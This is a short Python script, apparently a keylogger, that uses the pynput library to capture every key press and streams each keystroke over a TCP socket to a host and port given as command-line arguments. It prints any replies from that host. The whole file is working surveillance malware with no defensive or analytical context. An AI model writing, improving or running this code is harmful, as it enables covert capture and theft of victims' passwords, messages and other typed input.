import socket
import sys

from pynput.keyboard import Key, Listener
HOST = sys.argv[1]
PORT = int(sys.argv[2])

def key_press(key):
	k = str(key)
	k = k.replace("'", "")
	s.sendall(bytes(k, "ascii"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    listener = Listener(on_press=key_press)
    listener.start()
    s.sendall(b'Hello, world')
    while True:
        data = s.recv(1024)
        print('Received', repr(data))